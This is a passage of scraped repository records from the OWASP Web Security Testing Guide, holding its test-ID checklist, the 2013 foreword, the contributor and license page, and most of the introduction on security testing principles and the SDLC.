with the four tabs as mentioned above.\n", "timestamp": "2025-10-24T11:39:38.245163"}
{"source": "github", "repo": "OWASP/wstg", "file": "checklists/checklist.md", "url": "https://github.com/OWASP/wstg/blob/master/checklists/checklist.md", "content": "# Testing Checklist\n\nThe following is the list of items to test during the assessment:\n\nNote: The `Status` column can be set for values similar to \"Pass\", \"Fail\", \"N/A\".\n\n| Test ID           | Test Name                                                                  | Status | Notes |\n|-------------------|----------------------------------------------------------------------------|--------|-------|\n| **WSTG-INFO**     | **Information Gathering**                                                  |        |       |\n| WSTG-INFO-01      | Conduct Search Engine Discovery and Reconnaissance for Information Leakage |        |       |\n| WSTG-INFO-02      | Fingerprint Web Server                                                     |        |       |\n| WSTG-INFO-03      | Review Webserver Metafiles for Information Leakage                         |        |       |\n| WSTG-INFO-04      | Enumerate Applications on Webserver                                        |        |       |\n| WSTG-INFO-05      | Review Webpage Content for Information Leakage                             |        |       |\n| WSTG-INFO-06      | Identify Application Entry Points                                          |        |       |\n| WSTG-INFO-07      | Map Execution Paths Through Application                                    |        |       |\n| WSTG-INFO-08      | Fingerprint Web Application Framework                                      |        |       |\n| WSTG-INFO-09      | Fingerprint Web Application                                                |        |       |\n| WSTG-INFO-10      | Map Application Architecture                                               |        |       |\n| **WSTG-CONF**     | **Configuration and Deploy Management Testing**                            |        |       |\n| WSTG-CONF-01      | Test Network Infrastructure Configuration                                  |        |       |\n| WSTG-CONF-02      | Test Application Platform Configuration                                    |        |       |\n| WSTG-CONF-03      | Test File Extensions Handling for Sensitive Information                    |        |       |\n| WSTG-CONF-04      | Review Old Backup and Unreferenced Files for Sensitive Information         |        |       |\n| WSTG-CONF-05      | Enumerate Infrastructure and Application Admin Interfaces                  |        |       |\n| WSTG-CONF-06      | Test HTTP Methods                                                          |        |       |\n| WSTG-CONF-07      | Test HTTP Strict Transport Security                                        |        |       |\n| WSTG-CONF-08      | Test RIA Cross Domain Policy                                               |        |       |\n| WSTG-CONF-09      | Test File Permission                                                       |        |       |\n| WSTG-CONF-10      | Test for Subdomain Takeover                                                |        |       |\n| WSTG-CONF-11      | Test Cloud Storage                                                         |        |       |\n| WSTG-CONF-12      | Testing for Content Security Policy                                        |        |       |\n| WSTG-CONF-13      | Test Path Confusion                                                        |        |       |\n| WSTG-CONF-14      | Test Other HTTP Security Header Misconfigurations                          |        |       |\n| **WSTG-IDNT**     | **Identity Management Testing**                                            |        |       |\n| WSTG-IDNT-01      | Test Role Definitions                                                      |        |       |\n| WSTG-IDNT-02      | Test User Registration Process                                             |        |       |\n| WSTG-IDNT-03      | Test Account Provisioning Process                                          |        |       |\n| WSTG-IDNT-04      | Testing for Account Enumeration and Guessable User Account                 |        |       |\n| WSTG-IDNT-05      | Testing for Weak or Unenforced Username Policy                             |        |       |\n| **WSTG-ATHN**     | **Authentication Testing**                                                 |        |       |\n| WSTG-ATHN-01      | Testing for Credentials Transported over an Encrypted Channel              |        |       |\n| WSTG-ATHN-02      | Testing for Default Credentials                                            |        |       |\n| WSTG-ATHN-03      | Testing for Weak Lock Out Mechanism                                        |        |       |\n| WSTG-ATHN-04      | Testing for Bypassing Authentication Schema                                |        |       |\n| WSTG-ATHN-05      | Testing for Vulnerable Remember Password                                   |        |       |\n| WSTG-ATHN-06      | Testing for Browser Cache Weakness                                         |        |       |\n| WSTG-ATHN-07      | Testing for Weak Password Policy                                           |        |       |\n| WSTG-ATHN-08      | Testing for Weak Security Question Answer                                  |        |       |\n| WSTG-ATHN-09      | Testing for Weak Password Change or Reset Functionalities                  |        |       |\n| WSTG-ATHN-10      | Testing for Weaker Authentication in Alternative Channel                   |        |       |\n| WSTG-ATHN-11      | Testing Multi-Factor Authentication (MFA)                                  |        |       |\n| **WSTG-ATHZ**     | **Authorization Testing**                                                  |        |       |\n| WSTG-ATHZ-01      | Testing Directory Traversal File Include                                   |        |       |\n| WSTG-ATHZ-02      | Testing for Bypassing Authorization Schema                                 |        |       |\n| WSTG-ATHZ-03      | Testing for Privilege Escalation                                           |        |       |\n| WSTG-ATHZ-04      | Testing for Insecure Direct Object References                              |        |       |\n| WSTG-ATHZ-05      | Testing for OAuth Weaknesses                                               |        |       |\n| **WSTG-SESS**     | **Session Management Testing**                                             |        |       |\n| WSTG-SESS-01      | Testing for Session Management Schema                                      |        |       |\n| WSTG-SESS-02      | Testing for Cookies Attributes                                             |        |       |\n| WSTG-SESS-03      | Testing for Session Fixation                                               |        |       |\n| WSTG-SESS-04      | Testing for Exposed Session Variables                                      |        |       |\n| WSTG-SESS-05      | Testing for Cross Site Request Forgery                                     |        |       |\n| WSTG-SESS-06      | Testing for Logout Functionality                                           |        |       |\n| WSTG-SESS-07      | Testing Session Timeout                                                    |        |       |\n| WSTG-SESS-08      | Testing for Session Puzzling                                               |        |       |\n| WSTG-SESS-09      | Testing for Session Hijacking                                              |        |       |\n| WSTG-SESS-10      | Testing JSON Web Tokens                                                    |        |       |\n| WSTG-SESS-11      | Testing for Concurrent Sessions                                            |        |       |\n| **WSTG-INPV**     | **Input Validation Testing**                                               |        |       |\n| WSTG-INPV-01      | Testing for Reflected Cross Site Scripting                                 |        |       |\n| WSTG-INPV-02      | Testing for Stored Cross Site Scripting                                    |        |       |\n| WSTG-INPV-03      | Testing for HTTP Verb Tampering                                            |        |       |\n| WSTG-INPV-04      | Testing for HTTP Parameter pollution                                       |        |       |\n| WSTG-INPV-05      | Testing for SQL Injection                                                  |        |       |\n| WSTG-INPV-06      | Testing for LDAP Injection                                                 |        |       |\n| WSTG-INPV-07      | Testing for XML Injection                                                  |        |       |\n| WSTG-INPV-08      | Testing for SSI Injection                                                  |        |       |\n| WSTG-INPV-09      | Testing for XPath Injection                                                |        |       |\n| WSTG-INPV-10      | Testing for IMAP SMTP Injection                                            |        |       |\n| WSTG-INPV-11      | Testing for Code Injection                                                 |        |       |\n| WSTG-INPV-12      | Testing for Command Injection                                              |        |       |\n| WSTG-INPV-13      | Testing for Format String Injection                                        |        |       |\n| WSTG-INPV-14      | Testing for Incubated Vulnerabilities                                      |        |       |\n| WSTG-INPV-15      | Testing for HTTP Splitting Smuggling                                       |        |       |\n| WSTG-INPV-16      | Testing for HTTP Incoming Requests                                         |        |       |\n| WSTG-INPV-17      | Testing for Host Header Injection                                          |        |       |\n| WSTG-INPV-18      | Testing for Server-Side Template Injection                                 |        |       |\n| WSTG-INPV-19      | Testing for Server-Side Request Forgery                                    |        |       |\n| WSTG-INPV-20      | Testing for Mass Assignment                                                |        |       |\n| **WSTG-ERRH**     | **Error Handling**                                                         |        |       |\n| WSTG-ERRH-01      | Testing for Improper Error Handling                                        |        |       |\n| WSTG-ERRH-02      | Testing for Stack Traces                                                   |        |       |\n| **WSTG-CRYP**     | **Cryptography**                                                           |        |       |\n| WSTG-CRYP-01      | Testing for Weak Transport Layer Security                                  |        |       |\n| WSTG-CRYP-02      | Testing for Padding Oracle                                                 |        |       |\n| WSTG-CRYP-03      | Testing for Sensitive Information Sent Via Unencrypted Channels            |        |       |\n| WSTG-CRYP-04      | Testing for Weak Encryption                                                |        |       |\n| **WSTG-BUSLOGIC** | **Business Logic Testing**                                                 |        |       |\n| WSTG-BUSL-01      | Test Business Logic Data Validation                                        |        |       |\n| WSTG-BUSL-02      | Test Ability to Forge Requests                                             |        |       |\n| WSTG-BUSL-03      | Test Integrity Checks                                                      |        |       |\n| WSTG-BUSL-04      | Test for Process Timing                                                    |        |       |\n| WSTG-BUSL-05      | Test Number of Times a Function Can Be Used Limits                         |        |       |\n| WSTG-BUSL-06      | Testing for the Circumvention of Work Flows                                |        |       |\n| WSTG-BUSL-07      | Test Defenses Against Application Misuse                                   |        |       |\n| WSTG-BUSL-08      | Test Upload of Unexpected File Types                                       |        |       |\n| WSTG-BUSL-09      | Test Upload of Malicious Files                                             |        |       |\n| WSTG-BUSL-10      | Test Payment Functionality                                                 |        |       |\n| **WSTG-CLIENT**   | **Client-side Testing**                                                    |        |       |\n| WSTG-CLNT-01      | Testing for DOM Based Cross Site Scripting                                 |        |       |\n| WSTG-CLNT-02      | Testing for JavaScript Execution                                           |        |       |\n| WSTG-CLNT-03      | Testing for HTML Injection                                                 |        |       |\n| WSTG-CLNT-04      | Testing for Client-Side URL Redirect                                       |        |       |\n| WSTG-CLNT-05      | Testing for CSS Injection                                                  |        |       |\n| WSTG-CLNT-06      | Testing for Client-Side Resource Manipulation                              |        |       |\n| WSTG-CLNT-07      | Test Cross Origin Resource Sharing                                         |        |       |\n| WSTG-CLNT-08      | Testing for Cross Site Flashing                                            |        |       |\n| WSTG-CLNT-09      | Testing for Clickjacking                                                   |        |       |\n| WSTG-CLNT-10      | Testing WebSockets                                                         |        |       |\n| WSTG-CLNT-11      | Test Web Messaging                                                         |        |       |\n| WSTG-CLNT-12      | Test Browser Storage                                                       |        |       |\n| WSTG-CLNT-13      | Testing for Cross Site Script Inclusion                                    |        |       |\n| WSTG-CLNT-14      | Testing for Reverse Tabnabbing                                             |        |       |\n| **WSTG-APIT**     | **API Testing**                                                            |        |       |\n| WSTG-APIT-01      | API Reconnaissance                                                         |        |       |\n| WSTG-APIT-02      | API Broken Object Level Authorization                                      |        |       |\n| WSTG-APIT-99      | Testing GraphQL                                                            |        |       |\n", "timestamp": "2025-10-24T11:39:38.384502"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/0-Foreword/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/0-Foreword/README.md", "content": "# Foreword by Eoin Keary\n\nThe problem of insecure software is perhaps the most important technical challenge of our time. The dramatic rise of web applications enabling business, social networking etc has only compounded the requirements to establish a robust approach to writing and securing our internet, web applications, and data.\n\nAt the Open Worldwide Application Security Project® (OWASP®), we're trying to make the world a place where insecure software is the anomaly, not the norm. The OWASP Testing Guide has an important role to play in solving this serious issue. It is vitally important that our approach to testing software for security issues is based on the principles of engineering and science. We need a consistent, repeatable and defined approach to testing web applications. A world without some minimal standards in terms of engineering and technology is a world in chaos.\n\nIt goes without saying that you can't build a secure application without performing security testing on it. Testing is part of a wider approach to build a secure system. Many software development organizations do not include security testing as part of their standard software development process. What is even worse is that many security vendors deliver testing with varying degrees of quality and rigor.\n\nSecurity testing, by itself, isn't a particularly good stand alone measure of how secure an application is, because there are an infinite number of ways that an attacker might be able to make an application break, and it simply isn't possible to test them all. We can't hack ourselves secure as we only have a limited time to test and defend where an attacker does not have such constraints.\n\nIn conjunction with other OWASP projects such as the Code Review Guide, the Development Guide and tools such as [ZAP](https://www.zaproxy.org/), this is a great start towards building and maintaining secure applications. This Testing Guide will show you how to verify the security of your running application. I highly recommend using these guides as part of your application security initiatives.\n\n## Why OWASP?\n\nCreating a guide like this is a huge undertaking, requiring the expertise of hundreds of people around the world. There are many different ways to test for security flaws and this guide captures the consensus of the leading experts on how to perform this testing quickly, accurately, and efficiently. OWASP gives like minded security folks the ability to work together and form a leading practice approach to a security problem.\n\nThe importance of having this guide available in a completely free and open way is important for the foundation's mission. It gives anyone the ability to understand the techniques used to test for common security issues. Security should not be a black art or closed secret that only a few can practice. It should be open to all and not exclusive to security practitioners but also QA, Developers and Technical Managers. The project to build this guide keeps this expertise in the hands of the people who need it - you, me and anyone that is involved in building software.\n\nThis guide must make its way into the hands of developers and software testers. There are not nearly enough application security experts in the world to make any significant dent in the overall problem. The initial responsibility for application security must fall on the shoulders of the developers because they write the code. It shouldn't be a surprise that developers aren't producing secure code if they're not testing for it or consider the types of bugs which introduce vulnerability.\n\nKeeping this information up to date is a critical aspect of this guide project. By adopting the wiki approach, the OWASP community can evolve and expand the information in this guide to keep pace with the fast moving application security threat landscape.\n\nThis Guide is a great testament to the passion and energy our members and project volunteers have for this subject. It shall certainly help to change the world a line of code at a time.\n\n## Tailoring and Prioritizing\n\nYou should adopt this guide in your organization. You may need to tailor the information to match your organization's technologies, processes, and organizational structure.\n\nIn general there are several different roles within organizations that may use this guide:\n\n- Developers should use this guide to ensure that they are producing secure code. These tests should be a part of normal code and unit testing procedures.\n- Software testers and QA should use this guide to expand the set of test cases they apply to applications. Catching these vulnerabilities early saves considerable time and effort later.\n- Security specialists should use this guide in combination with other techniques as one way to verify that no security holes have been missed in an application.\n- Project Managers should consider the reason this guide exists and that security issues are manifested via bugs in code and design.\n\nThe most important thing to remember when performing security testing is to continuously re-prioritize. There are infinite ways that an application could fail, and organizations always have limited testing time and resources. Be sure time and resources are spent wisely. Try to focus on the security holes that are a real risk to your business. Try to contextualize risk in terms of the application and its use cases.\n\nThis guide is best viewed as a set of techniques that you can use to find different types of security holes. But not all the techniques are equally important. Try to avoid using the guide as a checklist, new vulnerabilities are always manifesting and no guide can be an exhaustive list of \"things to test for\", but rather a great place to start.\n\n## The Role of Automated Tools\n\nThere are a number of companies selling automated security analysis and testing tools. Remember the limitations of these tools so that you can use them for what they're good at. As Michael Howard put it at the 2006 OWASP AppSec Conference in Seattle, \"Tools do not make software secure! They help scale the process and help enforce policy.\"\n\nMost importantly, these tools are generic - meaning that they are not designed for your custom code, but for applications in general. That means that while they can find some generic problems, they do not have enough knowledge of your application to allow them to detect most flaws. In my experience, the most serious security issues are the ones that are not generic, but deeply intertwined in your business logic and custom application design.\n\nThese tools can also be very useful, since they do find lots of potential issues. While running the tools doesn't take much time, each one of the potential problems takes time to investigate and verify. If the goal is to find and eliminate the most serious flaws as quickly as possible, consider whether your time is best spent with automated tools or with the techniques described in this guide. Still, these tools are certainly part of a well-balanced application security program. Used wisely, they can support your overall processes to produce more secure code.\n\n## Call to Action\n\nIf you're building, designing or testing software, I strongly encourage you to get familiar with the security testing guidance in this document. It is a great road map for testing the most common issues that applications are facing today, but it is not exhaustive. If you find errors, please add a note to the discussion page or make the change yourself. You'll be helping thousands of others who use this guide.\n\nPlease consider [joining us](https://owasp.org/membership/) as an individual or corporate member so that we can continue to produce materials like this testing guide and all the other great projects at OWASP.\n\nThank you to all the past and future contributors to this guide, your work will help to make applications worldwide more secure.\n\n--Eoin Keary, OWASP Board Member, April 19, 2013\n\nOpen Worldwide Application Security Project and OWASP are registered trademarks of the OWASP Foundation, Inc.\n", "timestamp": "2025-10-24T11:39:39.100423"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/1-Frontispiece/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/1-Frontispiece/README.md", "content": "# Frontispiece\n\n## Welcome\n\n> As we focus on incremental improvement, this release introduces numerous updates. We've standardized scenario formats to create a better reading experience, added objectives for each testing scenario, merged sections, and added new scenarios on some modern testing topics.\n>\n> — Rick Mitchell\n\nOWASP thanks the many authors, reviewers, and editors for their hard work in bringing this guide to where it is today. If you have any comments or suggestions on the Testing Guide, please feel free to open an Issue or submit a fix/contribution via Pull Request to our [GitHub repository](https://github.com/OWASP/wstg/).\n\n## Copyright and Licensee\n\nCopyright (c) 2025 The OWASP Foundation.\n\nThis document is released under the [Creative Commons 4.0 License](https://creativecommons.org/licenses/by-sa/4.0/). Please read and understand the license and copyright conditions.\n\n## Leaders\n\n- Elie Saad\n- Rick Mitchell\n\n## Core Team\n\n- Rejah Rehim\n- Victoria Drake\n\n## Authors\n\n- Aaron Williams\n- Alessia Michela Di Campi\n- Elie Saad\n- Felix Sieges\n- Ismael Goncalves\n- Janos Zold\n- Jeremy Bonghwan Choi\n- Jinson Varghese Behanan\n- Joel Espunya\n- Joel Aviad Ossi\n- Manh Pham Tien\n- Mark Clayton\n- Or Asaf\n- Phu Nguyen (Tony)\n- rbsec\n- Rick Mitchell\n- Rishu Ranjan\n- Rubal Jain\n- Samuele Casarin\n- Stefano Calzavara\n- Tal Argoni\n- Victoria Drake\n- Omar Jezi\n\n## Graphic Designers\n\n- Hugo Costa\n- Jishnu Vijayan C K\n- Muhammed Anees\n- Ramzi Fazah\n\n## Reviewers or Editors\n\n- Abhi M Balakrishnan\n- Asharaf Ali\n- Elie Saad\n- Eoin Murphy\n- Evan Read (alp1n3-eth)\n- Francisco Bustos\n- frozensolid\n- Hsiang-Chih Hsu\n- Jeremy Bonghwan Choi\n- Jinson Varghese Behanan\n- Lukasz Lubczynski\n- Miguel Arevalo\n- Najam Ul Saqib\n- Nikoleta Misheva\n- Olivier Konaté\n- Patrick Santos\n- Rejah Rehim\n- Rick Mitchell\n- Roman Mueller\n- Thomas Lim\n- Tom Bowyer\n- Victoria Drake\n\n## Trademarks\n\n- Java, Java Web Server, and JSP are registered trademarks of Sun Microsystems, Inc.\n- Merriam-Webster is a trademark of Merriam-Webster, Inc.\n- Microsoft is a registered trademark of Microsoft Corporation.\n- Octave is a service mark of Carnegie Mellon University.\n- Open Worldwide Application Security Project and OWASP are registered trademarks of the OWASP Foundation, Inc.\n- VeriSign and Thawte are registered trademarks of VeriSign, Inc.\n- Visa is a registered trademark of VISA USA.\n\nAll other products and company names may be trademarks of their respective owners. Use of a term in this document should not be regarded as affecting the validity of any trademark or service mark.\n\n## Contacting OWASP\n\nContact details for the [OWASP Foundation](https://owasp.org/) are available [online](https://owasp.org/contact/). If you have a question concerning a particular project, we strongly recommend using the [Google Group](https://groups.google.com/a/owasp.org/forum/) for that project. Many questions can also be answered by searching the [OWASP](https://owasp.org/) site, so please check there first.\n\n### Follow Us\n\n[![Follow OWASP on LinkedIn](images/follow_badge.png)](https://www.linkedin.com/company/owasp/)\n\n[![Follow @owasp_wstg on twitter](https://img.shields.io/twitter/follow/owasp_wstg?style=social)](https://twitter.com/owasp_wstg)\n", "timestamp": "2025-10-24T11:39:39.477056"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/2-Introduction/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/2-Introduction/README.md", "content": "# Introduction\n\n## The OWASP Testing Project\n\nThe OWASP Testing Project has been in development for many years. The aim of the project is to help people understand the *what*, *why*, *when*, *where*, and *how* of testing web applications. The project has delivered a complete testing framework, not merely a simple checklist or prescription of issues that should be addressed. Readers can use this framework as a template to build their own testing programs or to qualify other people’s processes. The Testing Guide describes in detail both the general testing framework and the techniques required to implement the framework in practice.\n\nWriting the Testing Guide has proven to be a difficult task. It was a challenge to obtain consensus and develop content that allowed people to apply the concepts described in the guide, while also enabling them to work in their own environment and culture. It was also a challenge to change the focus of web application testing from penetration testing to testing integrated in the software development lifecycle.\n\nHowever, the group is very satisfied with the results of the project. Many industry experts and security professionals, some of whom are responsible for software security at some of the largest companies in the world, are validating the testing framework. This framework helps organizations test their web applications in order to build reliable and secure software. The framework does not simply highlight areas of weakness, although that is certainly a by-product of many of the OWASP guides and checklists. As such, hard decisions had to be made about the appropriateness of certain testing techniques and technologies. The group fully understands that not everyone will agree with all of these decisions. However, OWASP is able to take the high ground and change culture over time through awareness and education, based on consensus and experience.\n\nThe rest of this guide is organized as follows: this introduction covers the pre-requisites of testing web applications and the scope of testing. It also covers the principles of successful testing and testing techniques, best practices for reporting, and business cases for security testing. Chapter 3 presents the OWASP Testing Framework and explains its techniques and tasks in relation to the various phases of the software development lifecycle. Chapter 4 covers how to test for specific vulnerabilities (e.g., SQL Injection) by code inspection and penetration testing.\n\n### Measuring Security: the Economics of Insecure Software\n\nA basic tenet of software engineering is summed up in a quote from [Controlling Software Projects: Management, Measurement, and Estimates](https://isbnsearch.org/isbn/9780131717114) by [Tom DeMarco](https://en.wikiquote.org/wiki/Tom_DeMarco):\n\n> You can't control what you can't measure.\n\nSecurity testing is no different. Unfortunately, measuring security is a notoriously difficult process.\n\nOne aspect that should be emphasized is that security measurements are about both the specific technical issues (e.g., how prevalent a certain vulnerability is) and how these issues affect the economics of software. Most technical people will at least understand the basic issues, or they may have a deeper understanding of the vulnerabilities. Sadly, few are able to translate that technical knowledge into monetary terms and quantify the potential cost of vulnerabilities to the application owner's business. Until this happens, CIOs will not be able to develop an accurate return on security investment and, subsequently, assign appropriate budgets for software security.\n\nWhile estimating the cost of insecure software may appear a daunting task, there has been a significant amount of work in this direction. In 2020 the Consortium for IT Software Quality [summarized](https://www.it-cisq.org/the-cost-of-poor-software-quality-in-the-us-a-2020-report/):\n\n> ...the cost of poor quality software in the US in 2018 is approximately $2.84 trillion...\n\nThe framework described in this document encourages people to measure security throughout the entire development process. They can then relate the cost of insecure software to the impact it has on the business, and consequently develop appropriate business processes, and assign resources to manage the risk. Remember that measuring and testing web applications is even more critical than for other software, since web applications are exposed to millions of users through the internet.\n\n### What is Testing?\n\nMany things need to be tested during the development lifecycle of a web application, but what does testing actually mean? The Oxford Dictionary of English defines \"test\" as:\n\n> **test** (noun): a procedure intended to establish the quality, performance, or reliability of something, especially before it is taken into widespread use.\n\nFor the purposes of this document, testing is a process of comparing the state of a system or application against a set of criteria. In the security industry, people frequently test against a set of mental criteria that are neither well defined nor complete. As a result of this, many outsiders regard security testing as a black art. The aim of this document is to change that perception, and to make it easier for people without in-depth security knowledge to make a difference in testing.\n\n### Why Perform Testing?\n\nThis document is designed to help organizations understand what comprises a testing program, and to help them identify the steps that need to be undertaken to build and operate a modern web application testing program. The guide gives a broad view of the elements required to make a comprehensive web application security program. This guide can be used as a reference and as a methodology to help determine the gap between existing practices and industry best practices. This guide allows organizations to compare themselves against industry peers, to understand the magnitude of resources required to test and maintain software, or to prepare for an audit. This chapter does not go into the technical details of how to test an application, as the intent is to provide a typical security organizational framework. The technical details about how to test an application, as part of a penetration test or code review, will be covered in the remaining parts of this document.\n\n### When to Test?\n\nMost people today don’t test software until it has already been created and is in the deployment phase of its lifecycle (i.e., code has been created and instantiated into a working web application). This is generally a very ineffective and cost-prohibitive practice. One of the best methods to prevent security bugs from appearing in production applications is to improve the Software Development lifecycle (SDLC) by including security in each of its phases. An SDLC is a structure imposed on the development of software artifacts. If an SDLC is not currently being used in your environment, it is time to pick one! The following figure shows a generic SDLC model as well as the (estimated) increasing cost of fixing security bugs in such a model.\n\n![Generic SDLC Model](images/SDLC.jpg)\\\n*Figure 2-1: Generic SDLC Model*\n\nCompanies should inspect their overall SDLC to ensure that security is an integral part of the development process. SDLCs should include security tests to ensure security is adequately covered and controls are effective throughout the development process.\n\n### What to Test?\n\nIt can be helpful to think of software development as a combination of people, process, and technology. If these are the factors that \"create\" software, then it is logical that these are the factors that must be tested. Today most people generally test the technology or the software itself.\n\nAn effective testing program should have components that test the following:\n\n- **People** – to ensure that there is adequate education and awareness;\n- **Process** – to ensure that there are adequate policies and standards and that people know how to follow these policies;\n- **Technology** – to ensure that the process has been effective in its implementation.\n\nUnless a holistic approach is adopted, testing just the technical implementation of an application will not uncover management or operational vulnerabilities that could be present. By testing the people, policies, and processes, an organization can catch issues that would later manifest themselves into defects in the technology, thus eradicating bugs early and identifying the root causes of defects. Likewise, testing only some of the technical issues that can be present in a system will result in an incomplete and inaccurate security posture assessment.\n\nDenis Verdon, Head of Information Security at [Fidelity National Financial](https://www.fnf.com), presented an excellent analogy for this misconception at the OWASP AppSec 2004 Conference in New York:\n\n> If cars were built like applications ... safety tests would assume frontal impact only. Cars would not be roll tested, or tested for stability in emergency maneuvers, brake effectiveness, side impact, and resistance to theft.\n\n### How to Reference WSTG Scenarios\n\nEach scenario has an identifier in the format `WSTG-<category>-<number>`, where: 'category' is a 4 character upper case string that identifies the type of test or weakness, and 'number' is a zero-padded numeric value from 01 to 99. For example:`WSTG-INFO-02` is the second Information Gathering test.\n\nThe identifiers may change between versions therefore it is preferable that other documents, reports, or tools use the format: `WSTG-<version>-<category>-<number>`, where: 'version' is the version tag with punctuation removed. For example: `WSTG-v42-INFO-02` would be understood to mean specifically the second Information Gathering test from version 4.2.\n\nIf identifiers are used without including the `<version>` element then they should be assumed to refer to the latest Web Security Testing Guide content. Obviously as the guide grows and changes this becomes problematic, which is why writers or developers should include the version element.\n\n#### Linking\n\nLinking to Web Security Testing Guide scenarios should be done using versioned links not `stable` or `latest` which will definitely change with time. However, it is the project team's intention that versioned links not change. For example: `https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server`. Note: the `v42` element refers to version 4.2.\n\n### Feedback and Comments\n\nAs with all OWASP projects, we welcome comments and feedback. We especially like to know that our work is being used and that it is effective and accurate.\n\n## Principles of Testing\n\nThere are some common misconceptions when developing a testing methodology to find security bugs in software. This chapter covers some of the basic principles that professionals should take into account when performing security tests on software.\n\n### There is No Silver Bullet\n\nWhile it is tempting to think that a security scanner or application firewall will provide many defenses against attack or identify a multitude of problems, in reality there is no silver bullet to the problem of insecure software. Application security assessment software, while useful as a first pass to find low-hanging fruit, is generally immature and ineffective at in-depth assessment or providing adequate test coverage. Remember that security is a process and not a product.\n\n### Think Strategically, Not Tactically\n\nSecurity professionals have come to realize the fallacy of the patch-and-penetrate model that was pervasive in information security during the 1990’s. The patch-and-penetrate model involves fixing a reported bug, but without proper investigation of the root cause. This model is usually associated with the window of vulnerability, also referred to as window of exposure, shown in the figure below. The evolution of vulnerabilities in common software used worldwide has shown the ineffectiveness of this model. For more information about windows of exposure, see [Schneier on Security](https://www.schneier.com/crypto-gram/archives/2000/0915.html).\n\nVulnerability studies such as [Symantec's Security Threat Report](https://www.symantec.com/security-center/threat-report) have shown that with the reaction time of attackers worldwide, the typical window of vulnerability does not provide enough time for patch installation, since the time between a vulnerability being uncovered and an automated attack against it being developed and released is decreasing every year.\n\nThere are several incorrect assumptions in the patch-and-penetrate model. Many users believe that patches interfere with normal operations or might break existing applications. It is also incorrect to assume that all users are aware of newly released patches. Consequently not all users of a product will apply patches, either because they think patching may interfere with how the software works, or because they lack knowledge about the existence of the patch.\n\n![Window of Vulnerability](images/WindowExposure.png)\\\n*Figure 2-2: Window of Vulnerability*\n\nIt is essential to build security into the Software Development Lifecycle (SDLC) to prevent reoccurring security problems within an application. Developers can build security into the SDLC by developing standards, policies, and guidelines that fit and work within the development methodology. Threat modeling and other techniques should be used to help assign appropriate resources to those parts of a system that are most at risk.\n\n### The SDLC is King\n\nThe SDLC is a process that is well-known to developers. By integrating security into each phase of the SDLC, it allows for a holistic approach to application security that leverages the procedures already in place within the organization. Be aware that while the names of the various phases may change depending on the SDLC model used by an organization, each conceptual phase of the archetype SDLC will be used to develop the application (i.e., define, design, develop, deploy, maintain). Each phase has security considerations that should become part of the existing process, to ensure a cost-effective and comprehensive security program.\n\nThere are several secure SDLC frameworks in existence that provide both descriptive and prescriptive advice. Whether a person takes descriptive or prescriptive advice depends on the maturity of the SDLC process. Essentially, prescriptive advice shows how the secure SDLC should work, and descriptive advice shows how it is used in the real world. Both have their place. For example, if you don't know where to start, a prescriptive framework can provide a menu of potential security controls that can be applied within the SDLC. Descriptive advice can then help drive the decision process by presenting what has worked well for other organizations. Descriptive secure SDLCs include BSIMM; and the prescriptive secure SDLCs include OWASP's [Open Software Assurance Maturity Model](https://www.opensamm.org/) (OpenSAMM), and [ISO/IEC 27034](https://www.iso27001security.com/html/27034.html) Parts 1-7, all published (except part 4).\n\n### Test Early and Test Often\n\nWhen a bug is detected early within the SDLC it can be addressed faster and at a lower cost. A security bug is no different from a functional or performance-based bug in this regard. A key step in making this possible is to educate the development and QA teams about common security issues and the ways to detect and prevent them. Although new libraries, tools, or languages can help design programs with fewer security bugs, new threats arise constantly and developers must be aware of the threats that affect the software they are developing. Education in security testing also helps developers acquire the appropriate mindset to test an application from an attacker's perspective. This allows each organization to consider security issues as part of their existing responsibilities.\n\n### Test Automation\n\nIn modern development methodologies such as (but not limited to): agile, devops/devsecops, or rapid application development (RAD) consideration should be put into integrating security tests in to continuous integration/continuous deployment (CI/CD) workflows in order to maintain baseline security information/analysis and identify \"low hanging fruit\" type weaknesses. This can be done by leveraging dynamic application security testing (DAST), static application security testing (SAST), and software composition analysis (SCA) or dependency tracking tools during standard automated release workflows or on a regularly scheduled basis.\n\n### Understand the Scope of Security\n\nIt is important to know how much security a given project will require. The assets that are to be protected should be given a classification that states how they are to be handled (e.g., confidential, secret, top secret). Discussions should occur with legal counsel to ensure that any specific security requirements will be met. In the USA, requirements might come from federal regulations, such as the [Gramm-Leach-Bliley Act](https://www.ftc.gov/business-guidance/privacy-security/gramm-leach-bliley-act), or from state laws, such as the [California SB-1386](https://leginfo.legislature.ca.gov/faces/billTextClient.xhtml?bill_id=200120020SB1386). For organizations based in EU countries, both country-specific regulation and EU Directives may apply. For example, [Directive 96/46/EC4](https://ec.europa.eu/info/policies/justice-and-fundamental-rights_en) and [Regulation (EU) 2016/679 (General Data Protection Regulation)](https://gdpr-info.eu/) make it mandatory to treat personal data in applications with due care, whatever the application. Non-EU organizations, under certain circumstances, may also be required to comply with the General Data Protection Regulation.\n\n### Develop the Right Mindset\n\nSuccessfully testing an application for security vulnerabilities requires thinking \"outside of the box.\" Normal use cases will test the normal behavior of the application when a user is using it in the manner that is expected. Good security testing requires going beyond what is expected and thinking like an attacker who is trying to break the application. Creative thinking can help to determine what unexpected data may cause an application to fail in an insecure manner. It can also help find any assumptions made by web developers that are not always true, and how those assumptions can be subverted. One reason that automated tools do a poor job of testing for vulnerabilities is that automated tools do not think creatively. Creative thinking must be done on a case-by-case basis, as most web applications are being developed in a unique way (even when using common frameworks).\n\n### Understand the Subject\n\nOne of the first major initiatives in any good security program should be to require accurate documentation of the application. The architecture, data-flow diagrams, use cases, etc. should be recorded in formal documents and made available for review. The technical specification and application documents should include information that lists not only the desired use cases, but also any specifically disallowed use cases. Finally, it is good to have at least a basic security infrastructure that allows the monitoring and trending of attacks against an organization's applications and network (e.g., intrusion detection systems).\n\n### Use the Right Tools\n\nWhile we have already stated that there is no silver bullet tool, tools do play a critical role in the overall security program. There is a range of Open Source and commercial tools that can automate many routine security tasks. These tools can simplify and speed up the security process by assisting security personnel in their tasks. However, it is important to understand exactly what these tools can and cannot do so that they are not oversold or used incorrectly.\n\n### The Devil is in the Details\n\nIt is critical not to perform a superficial security review of an application and consider it complete. This will instill a false sense of confidence that can be as dangerous as not having done a security review in the first place. It is vital to 